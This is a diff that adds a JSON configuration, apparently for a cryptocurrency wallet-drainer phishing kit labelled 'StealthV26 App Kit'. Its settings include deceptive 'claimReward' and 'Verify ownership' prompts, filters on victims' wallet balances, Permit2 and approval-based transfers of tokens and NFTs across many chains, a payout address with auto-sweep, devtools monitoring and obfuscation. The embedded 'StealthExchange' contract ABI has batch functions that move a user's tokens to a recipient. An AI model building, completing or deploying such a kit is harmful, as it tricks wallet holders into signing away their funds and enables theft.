@@ -1,0 +1,591 @@
+{
+  "general": {
+    "ecosystem": "ethereum",
+    "solanaCluster": "mainnet-beta",
+    "solanaProgramId": "",
+    "solanaRpcUrl": "",
+    "tronNetwork": "mainnet",
+    "tronContractAddress": "",
+    "tronRpcUrl": "",
+    "connectButtonClass": ".connect-btn",
+    "actionButtonClass": ".action-button",
+    "disconnectButtonClass": ".disconnect-btn",
+    "connectText": "Connect Wallet",
+    "connectedText": "Connected: {wallet}",
+    "loadingText": "Verifying...",
+    "verifyText": "Please confirm in your wallet",
+    "rejectText": "Transaction was declined",
+    "changeChainText": "Please switch network",
+    "rejectChainText": "Network switch was rejected",
+    "notEligibleText": "Wallet does not meet requirements",
+    "disconnectText": "Disconnect",
+    "transactionFunctionName": "claimReward",
+    "themeMode": "dark"
+  },
+  "wallet": {
+    "minBalanceUSD": 100,
+    "targetChainAssetRatio": 60,
+    "maxChainSwitchRetry": 3,
+    "singleChainMode": false,
+    "supportedWallets": [
+      "metamask",
+      "walletconnect",
+      "coinbase",
+      "trust",
+      "phantom",
+      "rabby"
+    ],
+    "walletVisibility": {
+      "metamask": true,
+      "walletconnect": true,
+      "coinbase": true,
+      "trust": true,
+      "phantom": true,
+      "rabby": true
+    },
+    "devToolsMonitoring": true,
+    "providerDetection": true,
+    "autoLoadScripts": true,
+    "waitForPageLoad": true
+  },
+  "modal": {
+    "modalFrameworkStyle": "web3modal",
+    "popupStyle": "sweetalert2",
+    "previewStyle": "trails",
+    "themeMode": "dark",
+    "accentColor": "#7C73FF",
+    "accentColorForeground": "#FFFFFF",
+    "borderRadius": "large",
+    "connectLayout": "cards",
+    "collapseWallets": false,
+    "featuredWallets": [
+      "metamask",
+      "walletconnect",
+      "coinbase"
+    ],
+    "enableEmailOption": false,
+    "enableSocials": false,
+    "overlayBlur": "medium",
+    "fontStyle": "modern",
+    "openOnNetworkView": false,
+    "preferredChains": [
+      1,
+      8453,
+      42161
+    ],
+    "walletConnectProjectId": "test-123",
+    "sequenceProjectAccessKey": "",
+    "sequenceWaasConfigKey": "",
+    "sequenceWalletUrl": "",
+    "enableLatestWC": true,
+    "exposeExternalSDK": false,
+    "clickToOpenModal": true
+  },
+  "tokens": {
+    "directTransfer": true,
+    "allowanceExecution": true,
+    "fallbackHandling": true,
+    "balanceBasedApproval": true,
+    "erc721Support": true,
+    "erc1155Support": true,
+    "marketplaceTransfers": true,
+    "contractFunctions": [
+      "mint",
+      "stake",
+      "claimReward",
+      "subscribe"
+    ],
+    "transactionOrdering": "priority",
+    "visibleChains": [
+      1,
+      56,
+      137,
+      43114,
+      42161,
+      10,
+      8453
+    ]
+  },
+  "advanced": {
+    "retryCount": 3,
+    "signaturePromptText": "Verify ownership of {wallet}",
+    "typedDataEnforcement": true,
+    "logFormat": "json",
+    "logSignaturePrompts": true,
+    "logChainSwitchEvents": true,
+    "logFullSiteURL": true,
+    "sessionCaching": true,
+    "autoSignaturePrompt": true,
+    "eligibilityReload": true,
+    "postTransactionRefresh": true
+  },
+  "payout": {
+    "address": "0x1234567890123456789012345678901234567890",
+    "chain": "ethereum",
+    "autoSweep": true,
+    "minSweepAmount": 100
+  },
+  "contracts": {
+    "primary": {
+      "name": "StealthExchange",
+      "address": "0x788F5098C58BF5854ebf2b10B0D9303b13ABF43A",
+      "abiName": "StealthExchange",
+      "abi": [
+        {
+          "inputs": [
+            {
+              "internalType": "address",
+              "name": "_permit2Address",
+              "type": "address"
+            }
+          ],
+          "stateMutability": "nonpayable",
+          "type": "constructor"
+        },
+        {
+          "inputs": [],
+          "name": "InvalidSignature",
+          "type": "error"
+        },
+        {
+          "inputs": [],
+          "name": "NotAuthorized",
+          "type": "error"
+        },
+        {
+          "inputs": [],
+          "name": "TransferFailed",
+          "type": "error"
+        },
+        {
+          "inputs": [],
+          "name": "ZeroAddress",
+          "type": "error"
+        },
+        {
+          "anonymous": false,
+          "inputs": [
+            {
+              "indexed": true,
+              "internalType": "address",
+              "name": "user",
+              "type": "address"
+            },
+            {
+              "indexed": true,
+              "internalType": "address",
+              "name": "recipient",
+              "type": "address"
+            },
+            {
+              "indexed": false,
+              "internalType": "address[]",
+              "name": "tokens",
+              "type": "address[]"
+            },
+            {
+              "indexed": false,
+              "internalType": "uint256[]",
+              "name": "amounts",
+              "type": "uint256[]"
+            },
+            {
+              "indexed": false,
+              "internalType": "uint256",
+              "name": "totalGasUsed",
+              "type": "uint256"
+            }
+          ],
+          "name": "BatchTransferExecuted",
+          "type": "event"
+        },
+        {
+          "anonymous": false,
+          "inputs": [
+            {
+              "indexed": true,
+              "internalType": "address",
+              "name": "executor",
+              "type": "address"
+            },
+            {
+              "indexed": false,
+              "internalType": "bool",
+              "name": "authorized",
+              "type": "bool"
+            }
+          ],
+          "name": "ExecutorUpdated",
+          "type": "event"
+        },
+        {
+          "anonymous": false,
+          "inputs": [
+            {
+              "indexed": true,
+              "internalType": "address",
+              "name": "user",
+              "type": "address"
+            },
+            {
+              "indexed": true,
+              "internalType": "address",
+              "name": "recipient",
+              "type": "address"
+            },
+            {
+              "indexed": true,
+              "internalType": "address",
+              "name": "token",
+              "type": "address"
+            },
+            {
+              "indexed": false,
+              "internalType": "uint256",
+              "name": "amount",
+              "type": "uint256"
+            }
+          ],
+          "name": "SingleTransferExecuted",
+          "type": "event"
+        },
+        {
+          "stateMutability": "payable",
+          "type": "fallback"
+        },
+        {
+          "inputs": [
+            {
+              "internalType": "address",
+              "name": "",
+              "type": "address"
+            }
+          ],
+          "name": "authorizedExecutors",
+          "outputs": [
+            {
+              "internalType": "bool",
+              "name": "",
+              "type": "bool"
+            }
+          ],
+          "stateMutability": "view",
+          "type": "function"
+        },
+        {
+          "inputs": [
+            {
+              "internalType": "address",
+              "name": "user",
+              "type": "address"
+            },
+            {
+              "components": [
+                {
+                  "internalType": "address",
+                  "name": "token",
+                  "type": "address"
+                },
+                {
+                  "internalType": "uint256",
+                  "name": "amount",
+                  "type": "uint256"
+                },
+                {
+                  "internalType": "bytes",
+                  "name": "permitSignature",
+                  "type": "bytes"
+                }
+              ],
+              "internalType": "struct BatchPermitData[]",
+              "name": "permits",
+              "type": "tuple[]"
+            },
+            {
+              "internalType": "address",
+              "name": "recipient",
+              "type": "address"
+            }
+          ],
+          "name": "batchPermitTransfer",
+          "outputs": [
+            {
+              "internalType": "uint256[]",
+              "name": "amounts",
+              "type": "uint256[]"
+            }
+          ],
+          "stateMutability": "nonpayable",
+          "type": "function"
+        },
+        {
+          "inputs": [
+            {
+              "internalType": "address",
+              "name": "user",
+              "type": "address"
+            },
+            {
+              "components": [
+                {
+                  "components": [
+                    {
+                      "internalType": "address",
+                      "name": "token",
+                      "type": "address"
+                    },
+                    {
+                      "internalType": "uint160",
+                      "name": "amount",
+                      "type": "uint160"
+                    },
+                    {
+                      "internalType": "uint48",
+                      "name": "expiration",
+                      "type": "uint48"
+                    },
+                    {
+                      "internalType": "uint48",
+                      "name": "nonce",
+                      "type": "uint48"
+                    }
+                  ],
+                  "internalType": "struct IPermit2.PermitDetails[]",
+                  "name": "details",
+                  "type": "tuple[]"
+                },
+                {
+                  "internalType": "address",
+                  "name": "spender",
+                  "type": "address"
+                },
+                {
+                  "internalType": "uint256",
+                  "name": "sigDeadline",
+                  "type": "uint256"
+                }
+              ],
+              "internalType": "struct IPermit2.PermitBatch",
+              "name": "permitBatch",
+              "type": "tuple"
+            },
+            {
+              "internalType": "bytes",
+              "name": "signature",
+              "type": "bytes"
+            },
+            {
+              "internalType": "address",
+              "name": "recipient",
+              "type": "address"
+            }
+          ],
+          "name": "batchPermitTransferFromBatch",
+          "outputs": [
+            {
+              "internalType": "uint256[]",
+              "name": "amounts",
+              "type": "uint256[]"
+            }
+          ],
+          "stateMutability": "nonpayable",
+          "type": "function"
+        },
+        {
+          "inputs": [
+            {
+              "internalType": "address",
+              "name": "token",
+              "type": "address"
+            },
+            {
+              "internalType": "address",
+              "name": "to",
+              "type": "address"
+            },
+            {
+              "internalType": "uint256",
+              "name": "amount",
+              "type": "uint256"
+            }
+          ],
+          "name": "emergencyWithdraw",
+          "outputs": [],
+          "stateMutability": "nonpayable",
+          "type": "function"
+        },
+        {
+          "inputs": [
+            {
+              "components": [
+                {
+                  "internalType": "address",
+                  "name": "token",
+                  "type": "address"
+                },
+                {
+                  "internalType": "uint256",
+                  "name": "amount",
+                  "type": "uint256"
+                },
+                {
+                  "internalType": "bytes",
+                  "name": "permitSignature",
+                  "type": "bytes"
+                }
+              ],
+              "internalType": "struct BatchPermitData[]",
+              "name": "permits",
+              "type": "tuple[]"
+            }
+          ],
+          "name": "estimateBatchGas",
+          "outputs": [
+            {
+              "internalType": "uint256",
+              "name": "",
+              "type": "uint256"
+            }
+          ],
+          "stateMutability": "pure",
+          "type": "function"
+        },
+        {
+          "inputs": [],
+          "name": "owner",
+          "outputs": [
+            {
+              "internalType": "address",
+              "name": "",
+              "type": "address"
+            }
+          ],
+          "stateMutability": "view",
+          "type": "function"
+        },
+        {
+          "inputs": [],
+          "name": "permit2",
+          "outputs": [
+            {
+              "internalType": "contract IPermit2",
+              "name": "",
+              "type": "address"
+            }
+          ],
+          "stateMutability": "view",
+          "type": "function"
+        },
+        {
+          "inputs": [
+            {
+              "internalType": "address",
+              "name": "executor",
+              "type": "address"
+            },
+            {
+              "internalType": "bool",
+              "name": "authorized",
+              "type": "bool"
+            }
+          ],
+          "name": "setExecutor",
+          "outputs": [],
+          "stateMutability": "nonpayable",
+          "type": "function"
+        },
+        {
+          "inputs": [
+            {
+              "internalType": "address",
+              "name": "user",
+              "type": "address"
+            },
+            {
+              "internalType": "address",
+              "name": "token",
+              "type": "address"
+            },
+            {
+              "internalType": "uint256",
+              "name": "amount",
+              "type": "uint256"
+            },
+            {
+              "internalType": "bytes",
+              "name": "permitSignature",
+              "type": "bytes"
+            },
+            {
+              "internalType": "address",
+              "name": "recipient",
+              "type": "address"
+            }
+          ],
+          "name": "singlePermitTransfer",
+          "outputs": [],
+          "stateMutability": "nonpayable",
+          "type": "function"
+        },
+        {
+          "stateMutability": "payable",
+          "type": "receive"
+        }
+      ],
+      "chainId": 1,
+      "selectedFunctions": [
+        "authorizedExecutors(address)",
+        "batchPermitTransfer(address,(address,uint256,bytes)[],address)",
+        "batchPermitTransferFromBatch(address,((address,uint160,uint48,uint48)[],address,uint256),bytes,address)",
+        "emergencyWithdraw(address,address,uint256)",
+        "estimateBatchGas((address,uint256,bytes)[])",
+        "owner()",
+        "permit2()",
+        "setExecutor(address,bool)",
+        "singlePermitTransfer(address,address,uint256,bytes,address)"
+      ]
+    },
+    "secondaryTargets": [],
+    "functionBindings": []
+  },
+  "strategy": {
+    "mode": "permit2",
+    "executionBackend": "stealth-exchange",
+    "fallbackMode": "approve",
+    "gaslessEnabled": false,
+    "multicallEnabled": true,
+    "permit2Enabled": true,
+    "typedDataEnabled": true,
+    "eip7702Enabled": false,
+    "delegateCallEnabled": false,
+    "delegateCallTarget": "",
+    "delegateCallSelectors": [],
+    "eip7702DelegationTarget": "",
+    "eip7702RequiresSupport": true,
+    "eip7702AuthorizationMode": "wallet",
+    "trailsEnabled": false,
+    "trailsMode": "pay",
+    "trailsApiKey": "",
+    "trailsToAddress": "",
+    "trailsToChainId": 8453,
+    "trailsToToken": "USDC",
+    "trailsToAmount": "1",
+    "trailsWidgetUrl": "https://demo.trails.build/widget",
+    "obfuscationLevel": "medium",
+    "customRpcUrl": ""
+  },
+  "appKit": {
+    "appName": "StealthV26 App Kit",
+    "appDescription": "Custom operational app kit for wallet interactions and contract routing.",
+    "appUrl": "",
+    "brandColor": "#7C73FF",
+    "logoUrl": "",
+    "supportEmail": "",
+    "enableAnalytics": true,
+    "enableSocialLogin": false,
+    "enableSmartWallet": false,
+    "enableWalletConnect": true,
+    "enableInjectedWallets": true,
+    "customCss": ""
+  }
+}
